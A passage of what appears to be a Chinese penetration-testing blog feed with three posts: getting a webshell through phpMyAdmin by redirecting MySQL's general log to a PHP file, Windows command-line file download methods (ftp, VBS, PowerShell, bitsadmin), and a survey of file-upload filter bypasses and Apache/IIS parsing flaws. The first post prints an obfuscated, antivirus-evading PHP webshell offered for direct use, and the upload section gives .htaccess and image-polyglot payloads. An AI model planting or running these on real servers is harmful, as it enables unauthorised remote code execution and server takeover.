    <content type="html"><![CDATA[<h3 id="mysql中的Into-outfile禁用的情况下，我该如何getshell？"><a href="#mysql中的Into-outfile禁用的情况下，我该如何getshell？" class="headerlink" title="mysql中的Into outfile禁用的情况下，我该如何getshell？"></a>mysql中的Into outfile禁用的情况下，我该如何getshell？</h3><p>目前<code>into outfile</code>被禁用</p><p>那么我们尝试通过一个脑洞大开的方法去getshell。</p><p><code>（必须是mysql root权限）</code></p><p>登录phpmyadmin后，查看全局变量：找到<code>general log和general log file</code></p><p><code>general log file</code>是存储了每一个sql语句执行的日志（包含SQL语句本身）</p><a id="more"></a><p>但是<code>general log</code>变量必须是<code>ON</code>状态，代表启用，然后再去更改</p><p><code>general log file</code>的地址为我们的webshell，绝对路径。</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/20170317_phpmyadmin%E6%96%B0%E5%A7%BF%E5%8A%BFgetshell/01.png" alt="phpmyadmin新姿势getshell"></p><p>在每一次更改<code>general log file</code>的时候mysql都会判断日志文件是否存在，如果不存在则会自动创建。</p><p>此时该文件已经创建，并且文件内容保存了最后一条SQL语句的日志信息。</p><pre><code class="hljs mysql">MySQLa, Version: 5.5.53 (MySQL Community Server (GPL)). started with: TCP Port: 3306, Named Pipe: MySQL Time Id Command Argument 121 Query SHOW GLOBAL VARIABLES WHERE Variable_name&#x3D;&quot;general_log_file&quot; 121 Quit</code></pre><p>接下来，我们直接随意查询SQL，每一句都会被写入这个ice.php</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/20170317_phpmyadmin%E6%96%B0%E5%A7%BF%E5%8A%BFgetshell/02.png" alt="phpmyadmin新姿势getshell"></p><p>下面再附上一个SQL查询免杀shell的语句，方便大家遇到此类情况直接利用：</p><pre><code class="hljs php">SELECT <span class="hljs-string">&quot;&lt;?php</span><span class="hljs-string"><span class="hljs-subst">$p</span> = array(&#x27;f&#x27;=&gt;&#x27;a&#x27;,</span><span class="hljs-string">#afffffffff</span><span class="hljs-string">&#x27;pffff&#x27;=&gt;&#x27;s&#x27;/*223* 1*/,</span><span class="hljs-string">&#x27;e&#x27;=&gt;&#x27;fffff&#x27;,//FJKSJKFSNMFSSDSDS//D*SA/*DSA&amp;*$@&amp;$@&amp;(#*(</span><span class="hljs-string">&#x27;lfaaaa&#x27;=&gt;&#x27;r&#x27;,//FJKSJKFSNMFSSDSDS//D*SA/*DSA&amp;*$@&amp;$@&amp;(#*(;</span><span class="hljs-string">&#x27;nnnnn&#x27;=&gt;&#x27;t&#x27;//&amp;$@&amp;(#*(;</span><span class="hljs-string">);//&amp;$@&amp;(#*(;</span><span class="hljs-string"><span class="hljs-subst">$a</span> = array_keys(<span class="hljs-subst">$p</span>);//9*9*5656</span><span class="hljs-string">@<span class="hljs-subst">$_</span>=<span class="hljs-subst">$p</span>[&#x27;pffff&#x27;].#/*@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@*/</span><span class="hljs-string"><span class="hljs-subst">$p</span>[&#x27;pffff&#x27;].<span class="hljs-subst">$a</span>[2];</span><span class="hljs-string">@<span class="hljs-subst">$_</span>=#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@</span><span class="hljs-string"><span class="hljs-subst">$p</span>[&#x27;f&#x27;]./*-/*-*/<span class="hljs-subst">$_</span>.#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@</span><span class="hljs-string"><span class="hljs-subst">$p</span>[&#x27;lfaaaa&#x27;].<span class="hljs-subst">$p</span>[&#x27;nnnnn&#x27;];#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@</span><span class="hljs-string">@<span class="hljs-subst">$_</span>#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@</span><span class="hljs-string">#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@</span><span class="hljs-string">(<span class="hljs-subst">$_REQUEST</span>[#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@</span><span class="hljs-string">#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@</span><span class="hljs-string">&#x27;username&#x27;#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@</span><span class="hljs-string">#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@</span><span class="hljs-string">]);</span><span class="hljs-string">?&gt;&quot;</span></code></pre><p>密码username</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/20170317_phpmyadmin%E6%96%B0%E5%A7%BF%E5%8A%BFgetshell/03.png" alt="phpmyadmin新姿势getshell"></p>]]></content>
    
    
    <categories>
      
      <category>漏洞复现</category>
      
    </categories>
    
    
    <tags>
      
      <tag>漏洞复现</tag>
      
      <tag>PHPMYADMIN</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>cmd下几种常见的下载文件的办法</title>
    <link href="/p/cd8ce2bf.html"/>
    <url>/p/cd8ce2bf.html</url>
    
    <content type="html"><![CDATA[<p>好久没更新博客了 是时候来加快脚步成长了  接下来慢慢 会更新些笔记</p><h3 id="win-03安装ftp服务"><a href="#win-03安装ftp服务" class="headerlink" title="win 03安装ftp服务"></a>win 03安装ftp服务</h3><p>先在我虚拟机里把ftp安装好 win2003的  打开 控制面板-添加或删除程序-添加、删除组件–应用程序服务器（详细信息）–iis信息服务器（详细信息）–ftp 服务</p><h3 id="1-ftp"><a href="#1-ftp" class="headerlink" title="1.ftp"></a>1.ftp</h3><p>ip：192.168.68.132</p><p>文件：test.txt</p><p>按顺序执行如下代码即可通过ftp来下载文件</p><p>cmd：</p><pre><code class="hljs powershell"><span class="hljs-built_in">echo</span> open <span class="hljs-number">192.168</span>.<span class="hljs-number">68.132</span> <span class="hljs-number">21</span>&gt; ftp.txt<span class="hljs-built_in">echo</span> ftp&gt;&gt; ftp.txt<span class="hljs-built_in">echo</span> bin &gt;&gt; ftp.txt<span class="hljs-built_in">echo</span> ftp&gt;&gt; ftp.txt<span class="hljs-built_in">echo</span> GET test.txt &gt;&gt; ftp.txtftp <span class="hljs-literal">-s</span>:ftp.txt</code></pre><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%AD%A6%E4%B9%A0%E6%96%87%E7%AB%A0/20170314_cmd%E4%B8%8B%E5%87%A0%E7%A7%8D%E5%B8%B8%E8%A7%81%E7%9A%84%E4%B8%8B%E8%BD%BD%E6%96%87%E4%BB%B6%E7%9A%84%E5%8A%9E%E6%B3%95/01.png" alt="cmd下几种常见的下载文件的办法"></p><a id="more"></a><h3 id="2-vbs"><a href="#2-vbs" class="headerlink" title="2.vbs"></a>2.vbs</h3><p>vbs downloader,使用msxml2.xmlhttp和adodb.stream对象</p><p>如下代码保存为.vbs文件：</p><pre><code class="hljs vbscript"><span class="hljs-keyword">Set</span> Post = <span class="hljs-built_in">CreateObject</span>(<span class="hljs-string">&quot;Msxml2.XMLHTTP&quot;</span>)<span class="hljs-keyword">Set</span> Shell = <span class="hljs-built_in">CreateObject</span>(<span class="hljs-string">&quot;Wscript.Shell&quot;</span>)Post.Open <span class="hljs-string">&quot;GET&quot;</span>,<span class="hljs-string">&quot;http://192.168.68.132/test.txt&quot;</span>,<span class="hljs-number">0</span>Post.Send()<span class="hljs-keyword">Set</span> aGet = <span class="hljs-built_in">CreateObject</span>(<span class="hljs-string">&quot;ADODB.Stream&quot;</span>)aGet.Mode = <span class="hljs-number">3</span>aGet.Type = <span class="hljs-number">1</span>aGet.Open()aGet.Write(Post.responseBody)aGet.SaveToFile <span class="hljs-string">&quot;C:\test\update\test.txt&quot;</span>,<span class="hljs-number">2</span></code></pre><p>对应到cmd下的命令为：</p><pre><code class="hljs powershell"><span class="hljs-built_in">echo</span> <span class="hljs-built_in">Set</span> Post = CreateObject(<span class="hljs-string">&quot;Msxml2.XMLHTTP&quot;</span>) &gt;&gt;download.vbs<span class="hljs-built_in">echo</span> <span class="hljs-built_in">Set</span> Shell = CreateObject(<span class="hljs-string">&quot;Wscript.Shell&quot;</span>) &gt;&gt;download.vbs<span class="hljs-built_in">echo</span> Post.Open <span class="hljs-string">&quot;GET&quot;</span>,<span class="hljs-string">&quot;http://192.168.68.132/test.txt&quot;</span>,<span class="hljs-number">0</span> &gt;&gt;download.vbs<span class="hljs-built_in">echo</span> Post.Send() &gt;&gt;download.vbs<span class="hljs-built_in">echo</span> <span class="hljs-built_in">Set</span> aGet = CreateObject(<span class="hljs-string">&quot;ADODB.Stream&quot;</span>) &gt;&gt;download.vbs<span class="hljs-built_in">echo</span> aGet.Mode = <span class="hljs-number">3</span> &gt;&gt;download.vbs<span class="hljs-built_in">echo</span> aGet.Type = <span class="hljs-number">1</span> &gt;&gt;download.vbs<span class="hljs-built_in">echo</span> aGet.Open() &gt;&gt;download.vbs<span class="hljs-built_in">echo</span> aGet.Write(Post.responseBody) &gt;&gt;download.vbs<span class="hljs-built_in">echo</span> aGet.SaveToFile <span class="hljs-string">&quot;C:\test\update\test.txt&quot;</span>,<span class="hljs-number">2</span> &gt;&gt;download.vbs</code></pre><h3 id="3-powershell"><a href="#3-powershell" class="headerlink" title="3.powershell"></a>3.powershell</h3><p>cmd：</p><pre><code class="hljs powershell">powershell (<span class="hljs-built_in">new-object</span> System.Net.WebClient).DownloadFile(<span class="hljs-string">&#x27;http://192.168.68.132/test.txt&#x27;</span>,<span class="hljs-string">&#x27;C:\Users\isky\Downloads\test.txt&#x27;</span>)</code></pre><h3 id="4-bitsadmin"><a href="#4-bitsadmin" class="headerlink" title="4.bitsadmin"></a>4.bitsadmin</h3><p>bitsadmin是一个命令行工具，可用于创建下载或上传工作和监测其进展情况。xp以后的Windows系统自带</p><p>使用方法：</p><p>cmd下：</p><pre><code class="hljs powershell">bitsadmin /transfer n http://download.sysinternals.com/files/PSTools.zip C:\Users\isky\Downloads\PSTools.zip</code></pre><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%AD%A6%E4%B9%A0%E6%96%87%E7%AB%A0/20170314_cmd%E4%B8%8B%E5%87%A0%E7%A7%8D%E5%B8%B8%E8%A7%81%E7%9A%84%E4%B8%8B%E8%BD%BD%E6%96%87%E4%BB%B6%E7%9A%84%E5%8A%9E%E6%B3%95/02.png" alt="cmd下几种常见的下载文件的办法"></p>]]></content>
    
    
    <categories>
      
      <category>学习文章</category>
      
    </categories>
    
    
    <tags>
      
      <tag>学习文章</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>文件上传绕过姿势总结</title>
    <link href="/p/bfca3976.html"/>
    <url>/p/bfca3976.html</url>
    
    <content type="html"><![CDATA[<p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%AD%A6%E4%B9%A0%E6%96%87%E7%AB%A0/20161209_%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF%E6%80%BB%E7%BB%93/01.png" alt="文件上传绕过姿势总结"></p><h1 id="0x00-上传流程概述"><a href="#0x00-上传流程概述" class="headerlink" title="0x00 上传流程概述"></a>0x00 上传流程概述</h1><p>一个文件以http协议上传的时候，将以post请求发送至web服务器。服务器接受并同意后，用户与web服务器建立连接，并且传输数据</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%AD%A6%E4%B9%A0%E6%96%87%E7%AB%A0/20161209_%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF%E6%80%BB%E7%BB%93/02.png" alt="文件上传绕过姿势总结"></p><p>而一般文件上传过程中检测部分由</p><ul><li><p>A 客户端javascript检测 （检测文件扩展名）</p></li><li><p>B 服务端MIME类型检测 （检测Content—Type）</p></li><li><p>C 服务端目录路径检测（检测和path相关参数）</p></li><li><p>D 服务端文件扩展名检测 （检测文件扩展名）</p></li><li><p>E 服务端内容检测 （检测是否含有恶意代码）</p><a id="more"></a></li></ul><h1 id="0x01-客户端检测绕过检测-（js检测）"><a href="#0x01-客户端检测绕过检测-（js检测）" class="headerlink" title="0x01 客户端检测绕过检测 （js检测）"></a>0x01 客户端检测绕过检测 （js检测）</h1><p>这一类型特征就是你会收到一个<code>javascript</code>的弹窗</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%AD%A6%E4%B9%A0%E6%96%87%E7%AB%A0/20161209_%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF%E6%80%BB%E7%BB%93/03.png" alt="文件上传绕过姿势总结"></p><h2 id="绕过方式"><a href="#绕过方式" class="headerlink" title="绕过方式"></a>绕过方式</h2><p>利用<code>firebug</code>禁用js<br>通过<code>brup</code>等代理工具</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%AD%A6%E4%B9%A0%E6%96%87%E7%AB%A0/20161209_%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF%E6%80%BB%E7%BB%93/24.png" alt="文件上传绕过姿势总结"></p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%AD%A6%E4%B9%A0%E6%96%87%E7%AB%A0/20161209_%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF%E6%80%BB%E7%BB%93/25.png" alt="文件上传绕过姿势总结"><br>即可成功上传</p><h1 id="0x02-服务端检测绕过-（MIME检测）"><a href="#0x02-服务端检测绕过-（MIME检测）" class="headerlink" title="0x02 服务端检测绕过 （MIME检测）"></a>0x02 服务端检测绕过 （MIME检测）</h1><p>一般来说界面如图</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%AD%A6%E4%B9%A0%E6%96%87%E7%AB%A0/20161209_%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF%E6%80%BB%E7%BB%93/04.png" alt="文件上传绕过姿势总结"></p><p>源码类似如下</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%AD%A6%E4%B9%A0%E6%96%87%E7%AB%A0/20161209_%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF%E6%80%BB%E7%BB%93/26.png" alt="文件上传绕过姿势总结"></p><p>可以看到里面仅仅只判断了 <code>Content-Type</code></p><h2 id="绕过方式-1"><a href="#绕过方式-1" class="headerlink" title="绕过方式"></a>绕过方式</h2><p>通过<code>brup</code>等代理工具</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%AD%A6%E4%B9%A0%E6%96%87%E7%AB%A0/20161209_%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF%E6%80%BB%E7%BB%93/05.png" alt="文件上传绕过姿势总结"></p><h1 id="0x03-服务端检测绕过-（扩展名检测）"><a href="#0x03-服务端检测绕过-（扩展名检测）" class="headerlink" title="0x03 服务端检测绕过 （扩展名检测）"></a>0x03 服务端检测绕过 （扩展名检测）</h1><p>常常采用一个黑名单或者白名单，对上传的文件的扩展名进行检测，符合条件才允许上传</p><h2 id="绕过方式-2"><a href="#绕过方式-2" class="headerlink" title="绕过方式"></a>绕过方式</h2><h3 id="文件名大小写绕过"><a href="#文件名大小写绕过" class="headerlink" title="文件名大小写绕过"></a>文件名大小写绕过</h3><p>如果，在代码层没有进行大小写统一，用AsP，pHp类似的文件名绕过黑名单</p><h3 id="名单列表绕过"><a href="#名单列表绕过" class="headerlink" title="名单列表绕过"></a>名单列表绕过</h3><p>利用黑名单里没有的，并且能够成功执行的命名，进行绕过，例如php3，php4之类的<br>白名单，截断绕过</p><h3 id="特殊文件名绕过"><a href="#特殊文件名绕过" class="headerlink" title="特殊文件名绕过"></a>特殊文件名绕过</h3><p>在windows下有些文件名是不被允许的，将http包里将文件名改为<code>test.asp.</code>或<code>test.asp_</code>（此处下划线为空格）这种命名方式在windows系统自动去掉点和空格</p><h3 id="截断绕过"><a href="#截断绕过" class="headerlink" title="截断绕过"></a>截断绕过</h3><p>0x00截断绕过，在asp程序有这种漏洞<br>传入name=<code>test.jpg0x00</code><br>type=gettype(name) 此处该函数处理方式从后往前扫描，因为0x00不是扩展名，然后获得出来的文件名即是<code>.jpg</code><br>if（type==jpg）<br>savefiletopath（uploadpath.name，name）但在此处0x00截断最后存入磁盘的是<code>test.jpg</code></p><h3 id="htaccess-文件攻击"><a href="#htaccess-文件攻击" class="headerlink" title=".htaccess 文件攻击"></a>.htaccess 文件攻击</h3><p>在apache里，这个文件作为一个配置文件，可以用来控制所在目录的访问权限以及解析设置。即是，可以通过设置可以将该目录下的所有文件作为php文件来解析，即可绕过</p><h4 id="方式"><a href="#方式" class="headerlink" title="方式"></a>方式</h4><p>利用某些写文件函数复写<code>.htaccess</code>文件，即可任意定义解析名单<br>通过一个.htaccess 文件调用 php 的解析器去解析一个文件名中只要包含”haha”这个字符串的<br>任意文件，所以无论文件名是什么样子，只要包含”haha”这个字符串，都可以被以 php 的方<br>式来解析，是不是相当邪恶，一个自定义的.htaccess 文件就可以以各种各样的方式去绕过很<br>多上传验证机制<br>建立一个<code>.htaccess</code>文件内容如下</p><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">FilesMatch</span> &quot;<span class="hljs-attr">haha</span>&quot;&gt;</span>SetHandler application/x-httpd-php<span class="hljs-tag">&lt;/<span class="hljs-name">FilesMatch</span>&gt;</span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%AD%A6%E4%B9%A0%E6%96%87%E7%AB%A0/20161209_%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF%E6%80%BB%E7%BB%93/06.png" alt="文件上传绕过姿势总结"></p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%AD%A6%E4%B9%A0%E6%96%87%E7%AB%A0/20161209_%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF%E6%80%BB%E7%BB%93/07.png" alt="文件上传绕过姿势总结"></p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%AD%A6%E4%B9%A0%E6%96%87%E7%AB%A0/20161209_%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF%E6%80%BB%E7%BB%93/08.png" alt="文件上传绕过姿势总结"></p><h1 id="0x04-服务端检测绕过（文件内容检测）"><a href="#0x04-服务端检测绕过（文件内容检测）" class="headerlink" title="0x04 服务端检测绕过（文件内容检测）"></a>0x04 服务端检测绕过（文件内容检测）</h1><h3 id="文件头检测"><a href="#文件头检测" class="headerlink" title="文件头检测"></a>文件头检测</h3><ul><li>jpg文件头</li></ul><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%AD%A6%E4%B9%A0%E6%96%87%E7%AB%A0/20161209_%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF%E6%80%BB%E7%BB%93/09.png" alt="文件上传绕过姿势总结"></p><ul><li>gif文件头</li><li><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%AD%A6%E4%B9%A0%E6%96%87%E7%AB%A0/20161209_%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF%E6%80%BB%E7%BB%93/10.png" alt="文件上传绕过姿势总结"></li><li>png文件头</li><li><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%AD%A6%E4%B9%A0%E6%96%87%E7%AB%A0/20161209_%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF%E6%80%BB%E7%BB%93/11.png" alt="文件上传绕过姿势总结"></li></ul><h4 id="方式-1"><a href="#方式-1" class="headerlink" title="方式"></a>方式</h4><p>常见图片一句话形式</p><pre><code class="hljs php">GIF89a(...some <span class="hljs-keyword">binary</span> data <span class="hljs-keyword">for</span> image...)<span class="hljs-meta">&lt;?php</span> phpinfo(); <span class="hljs-meta">?&gt;</span>;(... skipping the rest of <span class="hljs-keyword">binary</span> data ...)</code></pre><h3 id="文件加载检测"><a href="#文件加载检测" class="headerlink" title="文件加载检测"></a>文件加载检测</h3><p>这个检测应该是最难绕过的，一般是调用API函数去进行文件加载测试，更有甚者二次渲染</p><h4 id="方式-2"><a href="#方式-2" class="headerlink" title="方式"></a>方式</h4><p>对渲染/加载测试攻击 代码注入绕过<br>对二次渲染攻击 攻击加载器</p><p>代码注入，和文件头的处理方式大致相同不过有了一个限定，你不能破坏这张图片，只能把你要的代码添加在空白区。保持文件结构的完整</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%AD%A6%E4%B9%A0%E6%96%87%E7%AB%A0/20161209_%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF%E6%80%BB%E7%BB%93/12.png" alt="文件上传绕过姿势总结"></p><h4 id="二次渲染"><a href="#二次渲染" class="headerlink" title="二次渲染"></a>二次渲染</h4><p>单独列出来这个方式有点特殊<br>我们如果还是上传一个过加载检测的图片</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%AD%A6%E4%B9%A0%E6%96%87%E7%AB%A0/20161209_%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF%E6%80%BB%E7%BB%93/13.png" alt="文件上传绕过姿势总结"></p><p>然后再从服务器上下载回本地</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%AD%A6%E4%B9%A0%E6%96%87%E7%AB%A0/20161209_%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF%E6%80%BB%E7%BB%93/14.png" alt="文件上传绕过姿势总结"></p><p>并且图片里多了<code>CREATOR: gd-jpeg v1.0 (using IJG JPEG v62)</code><br>说明使用GD php 的gd库</p><p>这里是某后台的调用GD库二次渲染的代码</p><pre><code class="hljs python">function image_gd_open($file, $extension)&#123;$extension = str_replace(<span class="hljs-string">&#x27;jpg&#x27;</span>, <span class="hljs-string">&#x27;jpeg&#x27;</span>, $extension);$open_func = <span class="hljs-string">&#x27;imageCreateFrom&#x27;</span>. $extension; //函数名变成 imageCreateFrompng 之类<span class="hljs-keyword">if</span> (!function_exists($open_func))&#123;<span class="hljs-keyword">return</span> FALSE;&#125;<span class="hljs-keyword">return</span> $open_func($file); //变成 imagecreatefrompng(<span class="hljs-string">&#x27;/tmp/php0lbTOn&#x27;</span>)&#125;</code></pre><p>将你上传的文件中属于图片部分的数据抓取出来，再使用自己的API或者函数重新将这张图片生成出来保存在服务端</p><h1 id="0x05-解析攻击"><a href="#0x05-解析攻击" class="headerlink" title="0x05 解析攻击"></a>0x05 解析攻击</h1><h2 id="直接攻击"><a href="#直接攻击" class="headerlink" title="直接攻击"></a>直接攻击</h2><p>直接能上传一个php文件绕过客户端<code>js检测</code>或者<code>服务端MIME检测</code></p><h2 id="配合解析"><a href="#配合解析" class="headerlink" title="配合解析"></a>配合解析</h2><p>先将代码以任意文件形式上传到服务器，通过<code>php文件包含</code><br><code>web服务器解析漏洞.htaccess解析</code>等<br>相互配合达成解析为目标文件类型的攻击</p><h3 id="Apache-解析漏洞"><a href="#Apache-解析漏洞" class="headerlink" title="Apache 解析漏洞"></a>Apache 解析漏洞</h3><ul><li><p>解析：<code>test.php.jkl</code> 并没<code>.jkl</code>后缀的文件，而<code>Apache</code>的某些版本中会直接当成<code>php</code>来解析</p></li><li><p>描述：若一个文件名<code>abc.x1.x2.x3</code>，<code>Apache</code>会从<code>x3</code>开始解析，如果<code>x3</code>不是一个能解析的扩展名，就往前解析<code>x2</code>以此往复，直到能遇到一个能解析的文件名为止</p></li><li><p>对应版本：</p><pre><code class="hljs apache"><span class="hljs-attribute">WampServer2</span>.<span class="hljs-number">0</span> <span class="hljs-literal">All</span> Version (WampServer<span class="hljs-number">2</span>.<span class="hljs-number">0</span>i / Apache <span class="hljs-number">2</span>.<span class="hljs-number">2</span>.<span class="hljs-number">11</span>)<span class="hljs-meta"> [Success]</span><span class="hljs-attribute">WampServer2</span>.<span class="hljs-number">1</span> <span class="hljs-literal">All</span> Version (WampServer<span class="hljs-number">2</span>.<span class="hljs-number">1</span>e-x<span class="hljs-number">32</span> / Apache <span class="hljs-number">2</span>.<span class="hljs-number">2</span>.<span class="hljs-number">17</span>)<span class="hljs-meta"> [Success]</span><span class="hljs-attribute">Wamp5</span> <span class="hljs-literal">All</span> Version (Wamp<span class="hljs-number">5</span>_<span class="hljs-number">1</span>.<span class="hljs-number">7</span>.<span class="hljs-number">4</span> / Apache <span class="hljs-number">2</span>.<span class="hljs-number">2</span>.<span class="hljs-number">6</span>)<span class="hljs-meta"> [Success]</span><span class="hljs-attribute">AppServ</span> <span class="hljs-number">2</span>.<span class="hljs-number">4</span> <span class="hljs-literal">All</span> Version (AppServ - <span class="hljs-number">2</span>.<span class="hljs-number">4</span>.<span class="hljs-number">9</span> / Apache <span class="hljs-number">2</span>.<span class="hljs-number">0</span>.<span class="hljs-number">59</span>)<span class="hljs-meta"> [Success]</span><span class="hljs-attribute">AppServ</span> <span class="hljs-number">2</span>.<span class="hljs-number">5</span> <span class="hljs-literal">All</span> Version (AppServ - <span class="hljs-number">2</span>.<span class="hljs-number">5</span>.<span class="hljs-number">10</span> / Apache <span class="hljs-number">2</span>.<span class="hljs-number">2</span>.<span class="hljs-number">8</span>)<span class="hljs-meta"> [Success]</span><span class="hljs-attribute">AppServ</span> <span class="hljs-number">2</span>.<span class="hljs-number">6</span> <span class="hljs-literal">All</span> Version (AppServ - <span class="hljs-number">2</span>.<span class="hljs-number">6</span>.<span class="hljs-number">0</span> / Apache <span class="hljs-number">2</span>.<span class="hljs-number">2</span>.<span class="hljs-number">8</span>)<span class="hljs-meta"> [Success]</span></code></pre></li></ul><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%AD%A6%E4%B9%A0%E6%96%87%E7%AB%A0/20161209_%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF%E6%80%BB%E7%BB%93/15.png" alt="文件上传绕过姿势总结"></p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%AD%A6%E4%B9%A0%E6%96%87%E7%AB%A0/20161209_%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF%E6%80%BB%E7%BB%93/16.png" alt="文件上传绕过姿势总结"></p><h3 id="IIS-解析漏洞"><a href="#IIS-解析漏洞" class="headerlink" title="IIS 解析漏洞"></a>IIS 解析漏洞</h3><ul><li><p>解析：<code>test.asp/jkl</code>,<code>IIS</code>的某些版本中会直接当成<code>asp</code>来解析;<code>test.asp;jkl</code>,<code>IIS</code>某些版本也会按照<code>asp</code>来解析；<code>任意文件名/任意文件名.php</code>，<code>IIS</code>某些版本会直接当<code>php</code>来解析</p></li><li><p>描述：<code>IIS6.0</code>在解析<code>asp</code>时有两个解析漏洞，一个是如果任意目录名包含<code>.asp</code>字符串，那么这个目录下的所有文件都会按照<code>asp</code>去解析，另一个是文件名中含有<code>asp;</code>就会优先当作<code>asp</code>来解析<br><code>IIS7.0/7.5</code>对php解析有类似<code>Nginx</code>的解析漏洞只要对任意文件名在url后面追加上字符串<code>/任意文件名.php</code>就会按照php去解析</p></li><li><p>对应版本：</p><pre><code class="hljs apache"><span class="hljs-attribute">IIS6</span>.<span class="hljs-number">0</span> (Win<span class="hljs-number">2003</span> SP<span class="hljs-number">2</span> + IIS<span class="hljs-number">6</span>.<span class="hljs-number">0</span>)<span class="hljs-meta"> [Success]</span><span class="hljs-attribute">IIS7</span>.<span class="hljs-number">0</span> (Win<span class="hljs-number">2008</span> R<span class="hljs-number">1</span> + IIS<span class="hljs-number">7</span>.<span class="hljs-number">0</span>)<span class="hljs-meta"> [Success]</span><span class="hljs-attribute">IIS7</span>.<span class="hljs-number">5</span> (Win<span class="hljs-number">2008</span> R<span class="hljs-number">2</span> + IIS<span class="hljs-number">7</span>.<span class="hljs-number">5</span>)<span class="hljs-meta"> [Success]</span></code></pre></li></ul><ul><li>注意<br><code>任意文件名/任意文件名.php</code>这个漏洞是因为<code>php-cgi</code></li></ul><p><code>IIS6.0</code></p><p><img 